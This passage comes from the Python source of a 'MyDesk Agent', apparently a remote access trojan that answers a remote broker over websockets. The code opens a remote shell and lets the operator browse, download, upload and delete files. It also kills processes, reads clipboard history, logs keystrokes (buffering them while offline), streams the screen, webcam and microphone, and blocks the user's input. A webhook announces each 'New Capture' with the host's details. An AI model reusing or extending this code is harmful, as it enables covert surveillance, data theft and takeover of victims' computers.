                        data = json.loads(payload.decode('utf-8'))
                        overlay_type = data.get('type', 'crack')
                        await self.loop.run_in_executor(None, self.troll_handler.show_overlay, overlay_type)
                    except Exception as e:
                        print(f"[-] Troll Overlay Error: {e}")
                
                elif opcode == protocol.OP_TROLL_STOP:
                    await self.loop.run_in_executor(None, self.troll_handler.stop_all)
                
                # ============================================================================
                # NEW HANDLERS
                # ============================================================================

                # SHELL
                elif opcode == protocol.OP_SETTING:
                    try:
                        # Param, Value
                        # Structure: [OP][PARAM_BYTE][VALUE_BYTE (bool)] or JSON
                        # For now assume JSON payload for simplicity or byte structure?
                        # Protocol doc says: param, value.
                        # Let's support JSON: {"id": int, "value": any}
                        try:
                            # Try JSON first
                            data = json.loads(payload.decode('utf-8'))
                            setting_id = int(data.get('id', 0))
                            value = data.get('value')
                        except:
                            # Fallback to bytes: [ID][Bool]
                            if len(payload) >= 2:
                                setting_id = payload[0]
                                value = bool(payload[1])
                            else:
                                return  # Invalid payload
                        
                        print(f"[*] Setting Change: ID={setting_id} Val={value}")
                        
                        if setting_id == protocol.SETTING_BLOCK_INPUT:
                            self.input_ctrl.block_input(bool(value))
                        
                        # ID 2 = SETTING_PRIVACY (from protocol.py)
                        elif setting_id == 2: 
                            # if value:
                            #     # Enable Privacy Mode
                            #     print("[+] Privacy Mode ENABLED")
                            #     self._launch_kiosk(mode="PRIVACY")
                            #     
                            #     # Use New Hook-Based Blocker via Controller
                            #     if self.input_ctrl:
                            #         self.input_ctrl.block_input(True)
                            # else:
                            #     # Disable Privacy Mode
                            #     print("[-] Privacy Mode DISABLED")
                            #     if self.kiosk_process:
                            #         try:
                            #             self.kiosk_process.terminate()
                            #             self.kiosk_process.wait(timeout=2)
                            #         except subprocess.TimeoutExpired:
                            #             self.kiosk_process.kill()
                            #             try:
                            #                 self.kiosk_process.wait(timeout=2)
                            #             except Exception:
                            #                 pass
                            #         except Exception:
                            #             pass
                            #         self.kiosk_process = None
                            #     
                            #     # Disable Blocker
                            #     if self.input_ctrl:
                            #         self.input_ctrl.block_input(False)
                            pass
                            
                    except Exception as e:
                        print(f"[-] Setting Error: {e}")

                elif opcode == protocol.OP_SHELL_EXEC:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        cmd = data.get('cmd')
                        shell_type = data.get('shell', 'ps')
                        
                        # Start shell if not running or type changed
                        if (not self.shell_handler.running or 
                            self.shell_handler.current_shell != shell_type):
                            
                            # Stop existing if running
                            if self.shell_handler.running:
                                await self.loop.run_in_executor(None, self.shell_handler.stop)
                            
                            # Run in executor to avoid blocking main loop
                            await self.loop.run_in_executor(None, self.shell_handler.start_shell, shell_type)
                            
                        # Write input (enter is handled by handler or client)
                        if cmd:
                            await self.loop.run_in_executor(None, self.shell_handler.write_input, cmd)
                    except Exception as e:
                        print(f"[-] Shell Exec Error: {e}")

                # PROCESS MANAGER
                elif opcode == protocol.OP_PM_LIST:
                    try:
                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                        data = self.process_mgr.to_json(procs)
                        self._send_async(protocol.OP_PM_DATA, data)
                    except Exception as e:
                        print(f"[-] PM List Error: {e}")
                
                elif opcode == protocol.OP_PM_KILL:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        pid = data.get('pid')
                        if pid:
                            await self.loop.run_in_executor(None, self.process_mgr.kill_process, pid)
                            # Refresh list after kill
                            procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                            data = self.process_mgr.to_json(procs)
                            self._send_async(protocol.OP_PM_DATA, data)
                    except Exception as e:
                        print(f"[-] PM Kill Error: {e}")

                # FILE MANAGER
                elif opcode == protocol.OP_FM_LIST:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path', '')
                        # Fix: list_files -> list_dir
                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, path)
                        
                        # Fix: Construct correct response structure since list_dir only returns list
                        current_path = path 
                        resp = json.dumps({'files': files, 'path': current_path}).encode('utf-8')
                        self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM List Error: {e}")

                elif opcode == protocol.OP_FM_DOWNLOAD:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Use executor to avoid blocking event loop
                            async def read_chunks_async(file_path):
                                queue = asyncio.Queue(maxsize=10) # Bounded
                                
                                def read_worker():
                                    try:
                                        for chunk in self.file_mgr.read_file_chunks(file_path):
                                            future = asyncio.run_coroutine_threadsafe(
                                                queue.put(chunk), self.loop
                                            )
                                            # Wait with timeout to detect dead loop
                                            try:
                                                future.result(timeout=5.0)
                                            except (TimeoutError, Exception):
                                                break
                                        
                                        # Signal end
                                        if self.loop.is_running():
                                            asyncio.run_coroutine_threadsafe(
                                                queue.put(None), self.loop
                                            )
                                    except Exception as e:
                                        print(f"[-] FM Read Worker Error: {e}")
                                        if self.loop.is_running():
                                            asyncio.run_coroutine_threadsafe(
                                                queue.put(None), self.loop
                                            )
                                
                                # Start worker thread
                                threading.Thread(target=read_worker, daemon=True).start()
                                
                                # Read from queue
                                while True:
                                    chunk = await queue.get()
                                    if chunk is None:
                                        break
                                    self._send_async(protocol.OP_FM_CHUNK, chunk)
                                
                                # Signal end of stream with empty chunk
                                self._send_async(protocol.OP_FM_CHUNK, b'')
                            
                            await read_chunks_async(path)
                    except Exception as e:
                        print(f"[-] FM Download Error: {e}")

                elif opcode == protocol.OP_FM_UPLOAD:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        b64_data = data.get('data')
                        if path and b64_data:
                            file_data = base64.b64decode(b64_data)
                            await self.loop.run_in_executor(None, self.file_mgr.write_file, path, file_data)
                            # Refresh list
                            parent = os.path.dirname(path)
                            # Fix: list_files -> list_dir and manual response construction
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Upload Error: {e}")

                elif opcode == protocol.OP_FM_DELETE:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Fix: delete_item -> delete
                            await self.loop.run_in_executor(None, self.file_mgr.delete, path)
                            # Refresh
                            parent = os.path.dirname(path)
                            # Fix: list_files -> list_dir
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Delete Error: {e}")

                elif opcode == protocol.OP_FM_MKDIR:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        path = data.get('path')
                        if path:
                            # Fix: create_directory -> mkdir
                            await self.loop.run_in_executor(None, self.file_mgr.mkdir, path)
                            # Refresh
                            parent = os.path.dirname(path.rstrip('/\\'))
                            files = await self.loop.run_in_executor(None, self.file_mgr.list_dir,  parent)
                            resp = json.dumps({'files': files, 'path': parent}).encode('utf-8')
                            self._send_async(protocol.OP_FM_DATA, resp)
                    except Exception as e:
                        print(f"[-] FM Mkdir Error: {e}")

                # CLIPBOARD
                elif opcode == protocol.OP_CLIP_GET:
                    try:
                        text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
                        if text is None: text = ""
                        self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
                    except Exception as e:
                        print(f"[-] Clip Get Error: {e}")
                        self._send_async(protocol.OP_CLIP_DATA, b'')

                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
                    # Send full clipboard history
                    try:
                        history = self.clipboard_handler.get_windows_history()
                        data = json.dumps(history).encode('utf-8')
                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                    except Exception as e:
                        print(f"[-] Clip History Error: {e}")

                elif opcode == protocol.OP_CLIP_DELETE:
                    # Delete entry by index
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        index = data.get('index', -1)
                        if index >= 0:
                            self.clipboard_handler.delete_entry(index)
                            # Send updated history
                            history = self.clipboard_handler.get_windows_history()
                            resp = json.dumps(history).encode('utf-8')
                            self._send_async(protocol.OP_CLIP_HISTORY_DATA, resp)
                    except Exception as e:
                        print(f"[-] Clip Delete Error: {e}")

                elif opcode == protocol.OP_CLIP_CONSENT:
                    # Update privacy consent state
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        self.clipboard_consent = bool(data.get('consent', False))
                        print(f"[+] Clipboard Consent Updated: {self.clipboard_consent}")
                        
                        # If enabled, send current history immediately
                        if self.clipboard_consent:
                             history = self.clipboard_handler.get_windows_history()
                             data = json.dumps(history).encode('utf-8')
                             self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                    except Exception as e:
                        print(f"[-] Clip Consent Error: {e}")

                # ================================================================
                # WebRTC Signaling (Project Supersonic)
                # ================================================================
                elif opcode == protocol.OP_RTC_OFFER:
                    await self._handle_rtc_offer(payload, source_ws)
                    
                elif opcode == protocol.OP_RTC_ANSWER:
                    # Agent doesn't receive answers (Agent sends answers)
                    pass
                    
                elif opcode == protocol.OP_ICE_CANDIDATE:
                    await self._handle_ice_candidate(payload)
                    
                elif opcode == protocol.OP_THROTTLE:
                    await self._handle_throttle(payload)

                # DEVICE SETTINGS (Volume, etc)
                # Network settings (WiFi/Ethernet) removed by user request
                
                elif opcode == protocol.OP_SET_VOLUME:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.set_volume, data['level'])
                    except Exception as e:
                        print(f"[-] Set Volume Error: {e}")

                elif opcode == protocol.OP_SET_MUTE:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.set_mute, data['muted'])
                    except Exception as e:
                        print(f"[-] Set Mute Error: {e}")

                elif opcode == protocol.OP_SET_BRIGHTNESS:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.set_brightness, data['level'])
                    except Exception as e:
                        print(f"[-] Set Brightness Error: {e}")

                elif opcode == protocol.OP_SET_TIME:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.set_time, data['datetime'])
                    except Exception as e:
                        print(f"[-] Set Time Error: {e}")

                elif opcode == protocol.OP_SYNC_TIME:
                    try:
                        await self.loop.run_in_executor(None, self.device_settings.sync_time)
                    except Exception as e:
                        print(f"[-] Sync Time Error: {e}")

                elif opcode == protocol.OP_POWER_ACTION:
                    try:
                        data = json.loads(payload.decode('utf-8'))
                        await self.loop.run_in_executor(None, self.device_settings.power_action, data['action'])
                    except Exception as e:
                        print(f"[-] Power Action Error: {e}")

                elif opcode == protocol.OP_GET_SYSINFO:
                    try:
                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                    except Exception as e:
                        print(f"[-] SysInfo Error: {e}")

                # =========================================================================
                # Clipboard (Privacy Gated)
                # =========================================================================
                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
                    if self.clipboard_consent:
                         # Retrieve and send history
                         history = self.clipboard_handler.get_history()
                         data = json.dumps(history).encode('utf-8')
                         self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                    else:
                         # Send empty or access denied? For now silent or empty.
                         self._send_async(protocol.OP_CLIP_HISTORY_DATA, b'[]')

                # =========================================================================
                # Troll (Auth & Cooldown)
                # =========================================================================
                elif protocol.OP_TROLL_URL <= opcode <= protocol.OP_TROLL_WHISPER:
                    if self._validate_troll_request(opcode, payload.decode('utf-8', errors='ignore')):
                         await self._handle_troll_op(opcode, payload)

                elif opcode == protocol.OP_DISCONNECT:
                    self.streaming = False
                    self.cam_streaming = False
                    self.mic_streaming = False
                    self.shell_handler.stop()
                
                return 
        except Exception as e:
            print(f"[-] Binary Handler Error: {e}")
            return 
            
        try:
            data = json.loads(message)
            op = data.get('op')
            
            if op == 'hello':
                await send_msg(source_ws, json.dumps({
                     'op': 'hello', 
                     'id': self.my_id,
                     'hostname': platform.node(),
                     'platform': platform.system()
                 }))
            elif op == 'start_stream':
                self.streaming = True
                asyncio.create_task(self.stream_screen(source_ws))
                self.auditor.start()
            elif op == 'stop_stream':
                self.streaming = False
                self.auditor.stop()
            elif op == 'mouse_move':
                if self.input_ctrl: self.input_ctrl.move_mouse(data['x'], data['y'])
            elif op == 'mouse_click':
                if self.input_ctrl: 
                    self.input_ctrl.move_mouse(data['x'], data['y'])
                    self.input_ctrl.click_mouse(data['button'], data['pressed'])
            
        except Exception as e:
            print(f"Error handling message: {e}")

    def announce_identity(self):
        if not WEBHOOK_URL:
            return
        
        msg = (f"**🔔 New Capture!**\n"
               f"**ID:** `{self.my_id}`\n"
               f"**User:** `{platform.node()}`\n"
               f"**OS:** `{platform.system()} {platform.release()}`")
        
        payload = {
            "content": msg,
            "username": "MyDesk Agent"
        }
        
        print("[*] Announcing Identity to webhook")
        try:
            req = urllib.request.Request(WEBHOOK_URL)
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            jsondata = json.dumps(payload).encode('utf-8')
            req.add_header('Content-Length', len(jsondata))
            
            urllib.request.urlopen(req, jsondata, timeout=5)
            print("[+] Announcement Sent")
        except Exception as e:
            print(f"[-] Announcement Failed: {e}")

    async def flush_buffer(self):
        """Flush offline buffer to new connection"""
        if not self.ws or not self.output_buffer:
            return
            
        print(f"[*] Flushing {len(self.output_buffer)} buffered messages...")
        # Copy buffer to iterate, but don't clear immediate to avoid data loss on failure
        msgs = list(self.output_buffer)
        
        try:
            for i, (opcode, payload) in enumerate(msgs):
                try:
                    await send_msg(self.ws, bytes([opcode]) + payload)
                    # Remove from original buffer only after success (thread-safe ish for async list?)
                    # Alternatively, just clear at end if all success. 
                    # But safest requested: pop item or only clear successful.
                    # Since we are single-threaded async here:
                    if self.output_buffer:
                        self.output_buffer.pop(0) 
                        
                except Exception as e:
                    print(f"[-] Flush Partial Error: {e}")
                    # Stop flushing, keep remaining in buffer
                    break
                    
                await asyncio.sleep(0.001) # Yield slightly
        except Exception as e:
            print(f"[-] Flush Error: {e}")

    async def connect_loop(self):
        print("[*] Agent connecting to broker")
        while True:
            try:
                # Optimized connection params for Render (Free Tier)
                async with websockets.connect(
                    self.broker_url,
                    open_timeout=20,     # Longer handshake for slow servers
                    ping_interval=None,  # Disable auto-ping to handle lags manually if needed
                    ping_timeout=120     # Very tolerant timeout
                ) as ws:
                    self.ws = ws
                    self.reconnect_delay = 1.0 # Reset backoff
                    print("[+] Connected to Broker!")
                    
                    payload = self.my_id
                    if self.direct_url:
                        payload += f"|{self.direct_url}"
                    
                    await send_msg(ws, bytes([protocol.OP_HELLO]) + payload.encode())

                    # FLUSH OFF-LINE BUFFER
                    await self.flush_buffer()


                    # ================================================================
                    # INITIAL DATA PUSH (Refresh on Connect)
                    # ================================================================
                    try:
                        # 1. SysInfo
                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                        self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                        
                        # 2. Process List
                        procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                        pm_data = self.process_mgr.to_json(procs)
                        self._send_async(protocol.OP_PM_DATA, pm_data)

                        # 3. File List (Home/Root)
                        home = os.path.expanduser("~")
                        files = await self.loop.run_in_executor(None, self.file_mgr.list_dir, home)
                        fm_resp = json.dumps({'files': files, 'path': home}).encode('utf-8')
                        self._send_async(protocol.OP_FM_DATA, fm_resp)
                        
                        print("[+] Initial Data Pushed")
                        
                        # Start clipboard monitoring for real-time updates
                        self.clipboard_handler.start_monitoring()
                    except Exception as e:
                        print(f"[-] Initial Push Partial Error: {e}")

                    await self.handle_messages()
                    
            except Exception as e:
                print(f"[-] Connection Lost: {e}")
                # GHOST MODE ENABLED: Do NOT stop shell/auditor
                
                self.ws = None # Mark as disconnected for buffering
                
                # Cleanup only streams (save bandwidth)
                self.streaming = False
                self.cam_streaming = False
                self.mic_streaming = False
                self.webcam.stop()
                self.mic.stop()
                
                # Exponential Backoff
                print(f"[*] Reconnecting in {self.reconnect_delay:.1f} seconds...")
                await asyncio.sleep(self.reconnect_delay)
                self.reconnect_delay = min(60.0, self.reconnect_delay * 1.5)


    async def _cwd_poll_loop(self):
        """Periodically poll CWD from shell handler and start sending updates"""
        while self.ws:
            try:
                if self.shell_handler.running:
                    cwd = await self.loop.run_in_executor(None, self.shell_handler.get_cwd)
                    if cwd:
                        self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8', errors='replace'))
            except Exception:
                pass
            await asyncio.sleep(2.0)

    async def handle_messages(self):
        """Broker Message Loop"""
        # DISABLED: CWD Poller sends stale data (psutil gets process cwd, not shell $pwd)
        # Viewer now parses __CWD__ markers directly from shell output
        # self._create_background_task(self._cwd_poll_loop())
        
        while True:
            msg = await recv_msg(self.ws)
            if not msg:
                break
            await self.handle_message(msg, self.ws)
                
        # CLEANUP ON DISCONNECT
        print("[!] Connection Lost/Reset. Cleaning up session state...")
        await self._cleanup_webrtc()
        
        # Reset input state (fix 'sticky keys' lockout)
        
        # Reset input state (fix 'sticky keys' lockout)
        if self.input_ctrl:
            self.input_ctrl.release_all_modifiers()
            # Fix: Release any held mouse buttons to prevent "stuck click"
            if hasattr(self.input_ctrl, 'release_all_buttons'):
                self.input_ctrl.release_all_buttons()
            # Also unblock input just in case (if we were admin)
            self.input_ctrl.block_input(False)
    
    def apply_settings(self, settings):
        """Apply capture settings from Viewer"""
        print(f"[*] Applying Settings: {settings}")
        quality = settings.get("quality", 50)
        scale = settings.get("scale", 90) / 100.0
        method = settings.get("method", "mss")
        fmt = settings.get("format", "WEBP")
        
        # Recreate capturer with new settings
        if hasattr(self, 'capturer') and self.capturer:
            if hasattr(self.capturer, 'release'):
                self.capturer.release()
            self.capturer = None

        self.capturer = ScreenCapturer(
            quality=quality, 
            scale=scale,
            method=method,
            format=fmt
        )
        # Explicitly log active method for user feedback
        active_method = "DXCam" if getattr(self.capturer, 'dxcam_active', False) else "MSS"
        print(f"[+] Settings Applied: Using {active_method} (Format: {fmt})")

    async def stream_screen(self, target_ws=None):
        print("[*] Screen Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        pending_send = None
        try:
            while self.streaming:
                # Check outcome of previous send
                if pending_send:
                    if not pending_send.done():
                        await asyncio.sleep(0.005)
                        continue
                    
                    # Check if previous send failed (e.g. Disconnect)
                    try:
                        exc = pending_send.exception()
                        if exc:
                            raise exc
                    except (websockets.exceptions.ConnectionClosed, ConnectionError):
                        print("[-] Screen Stream: Detected Disconnect in Send Task")
                        break
                    except Exception as e:
                        print(f"[-] Frame Send Error: {e}")
                
                start_time = asyncio.get_running_loop().time()
                
                # Capture Frame
                try:
                    jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
                except Exception as cap_err:
                    print(f"[-] Capture Error: {cap_err}")
                    await asyncio.sleep(1) # Backoff on capture fail
                    continue

                if jpeg:
                    header = bytes([protocol.OP_IMG_FRAME])
                    # Create new send task
                    coro = send_msg(ws_to_use, header + jpeg)
                    pending_send = self.loop.create_task(coro)
                
                elapsed = asyncio.get_running_loop().time() - start_time
                wait_time = max(0.001, (1.0/self.target_fps) - elapsed)
                await asyncio.sleep(wait_time)
                
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Screen Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Screen Stream Fatal Error: {e}")
        finally:
            self.streaming = False
            # Explicit cleanup to prevent DXCam lock
            if hasattr(self, 'capturer') and self.capturer:
                if hasattr(self.capturer, 'release'):
                    self.capturer.release()
                self.capturer = None
            
            # Ensure global cleanup is triggered if we detected disconnect here
            # (In case the main receive loop is stuck)
            await self._cleanup_webrtc()
            
    async def stream_webcam(self, target_ws=None):
        print("[*] Webcam Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        try:
            while self.cam_streaming:
                jpeg = await self.loop.run_in_executor(None, self.webcam.get_frame_bytes)
                if jpeg:
                    header = bytes([protocol.OP_CAM_FRAME])
                    await send_msg(ws_to_use, header + jpeg)
                await asyncio.sleep(0.06)
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Webcam Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Webcam Stream Error: {e}")
        finally:
            self.cam_streaming = False

    async def stream_mic(self, target_ws=None):
        print("[*] Mic Streaming Task Started")
        ws_to_use = target_ws if target_ws else self.ws
        restart_attempts = 0
        MAX_RESTARTS = 3
        failures = 0
        try:
            while self.mic_streaming:
                try:
                    chunk = await self.loop.run_in_executor(None, self.mic.get_chunk)
                    if chunk:
                        failures = 0 # Reset counter on success
                        restart_attempts = 0 # Reset restarts
                        header = bytes([protocol.OP_AUDIO_CHUNK])
                        await send_msg(ws_to_use, header + chunk)
                    else:
                        await asyncio.sleep(0.01)
                except Exception as e:
                    failures += 1
                    print(f"[-] Mic Read Error ({failures}): {e}")
                    # If it's a fatal error, try to restart the stream
                    if failures > 5:
                        if restart_attempts >= MAX_RESTARTS:
                             print("[-] Mic Max Restarts Exceeded.")
                             break
                        
                        # Increment once per attempt scope
                        restart_attempts += 1
                        print(f"[*] Restarting Mic (Attempt {restart_attempts}/{MAX_RESTARTS})...")
                        self.mic.stop()
                        
                        # Backoff
                        await asyncio.sleep(min(30, 2 ** restart_attempts))
                        
                        if self.mic.start():
                            failures = 0 
                            print("[+] Mic Restored")
                            continue
                        else:
                            print("[-] Mic Restart Failed.")
                            # Increment failures to respect restart counter
                            failures += 1
                            await asyncio.sleep(5)
                    
                    await asyncio.sleep(0.1)
                
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Mic Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Mic Stream Fatal Error: {e}")
        finally:
            self.mic_streaming = False


    def send_key_sync(self, key_str):
        if self.loop:
            asyncio.run_coroutine_threadsafe(self.send_key_async(key_str), self.loop)

    async def send_key_async(self, key_str):
        try:
            # print(f"[DEBUG] Agent SendKey Async: '{key_str}' WS={self.ws is not None} Direct={len(self.direct_ws_clients)}")
            msg = bytes([protocol.OP_KEY_LOG]) + key_str.encode('utf-8')
            # Broadcast to Broker
            if self.ws:
                await send_msg(self.ws, msg)
            else:
                # GHOST MODE: Buffer keystrokes
                if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
                    self.output_buffer.append((protocol.OP_KEY_LOG, key_str.encode('utf-8')))

            # Broadcast to All Direct Clients
            for client in list(self.direct_ws_clients):
                await send_msg(client, msg)
        except Exception as e:
            print(f"[-] Keylog Send Error: {e}")
            pass





def disable_quickedit():
    """Disable Windows Console QuickEdit and Insert Mode to prevent hanging."""
    if platform.system() == "Windows":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            
            # std input handle
            STD_INPUT_HANDLE = -10
            hInput = kernel32.GetStdHandle(STD_INPUT_HANDLE)
            
            # current mode
            mode = ctypes.c_ulong()
            if not kernel32.GetConsoleMode(hInput, ctypes.byref(mode)):
                return

            # remove ENABLE_QUICK_EDIT_MODE (0x40) and ENABLE_INSERT_MODE (0x20)
            # 0x0040 | 0x0020 = 0x0060
            new_mode = mode.value & ~0x0060
            
            # set new mode
            kernel32.SetConsoleMode(hInput, new_mode)
            print("[+] Console QuickEdit Disabled")
        except Exception as e:
            print(f"[-] Failed to disable QuickEdit: {e}")

def main():
    disable_quickedit()
    
    # CRASH LOGGER: Wrap main execution
    try:
        parser = argparse.ArgumentParser(description="MyDesk Agent")
        parser.add_argument("--local", action="store_true", help="Run in local mode (skip Cloudflare Tunnel)")
        # Add kiosk mode for direct launch
        parser.add_argument("--kiosk", action="store_true", help="Launch internal Kiosk (Internal Use)")
        parser.add_argument("--mode", default="update", help="Kiosk mode (update, black, privacy)")
        args = parser.parse_args()

        # Helper to check for --kiosk early before heavy imports or networking
        if args.kiosk:
            # try:
            #     # Import and run kiosk directly
            #     # Supports both frozen and source if path is correct
            #     try:
            #         from targets.kiosk import KioskApp
            #     except ImportError:
            #         # If path isn't set up yet in frozen env
            #         sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            #         from kiosk import KioskApp
            #     
            #     kiosk = KioskApp(mode=args.mode)
            #     kiosk.start()
            #     return
            # except Exception as e:
            #     # If kiosk fails, just exit to avoid zombie processes
            #     if platform.system() == "Windows":
            #         import ctypes
            #         ctypes.windll.user32.MessageBoxW(0, f"Kiosk Error: {e}", "Error", 0)
            #     else:
            #         print(f"Kiosk Error: {e}")
            #     return
            return

        agent = AsyncAgent(DEFAULT_BROKER)
        agent.start(local_mode=args.local)
    except Exception:
        # Log fatal crash
        import traceback
        import datetime
        
        crash_file = "crash_log.txt"
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
            crash_file = os.path.join(base_dir, "crash_log.txt")
            
        with open(crash_file, "a") as f:
            f.write(f"\n\n[{datetime.datetime.now()}] FATAL CRASH:\n")
            traceback.print_exc(file=f)
            
        # Optional: Try to show message box if GUI is available
        # import ctypes
        # ctypes.windll.user32.MessageBoxW(0, f"Agent Crashed: {e}\nSee crash_log.txt", "Fatal Error", 0)
        sys.exit(1)

if __name__ == "__main__":
    main()
# alr 
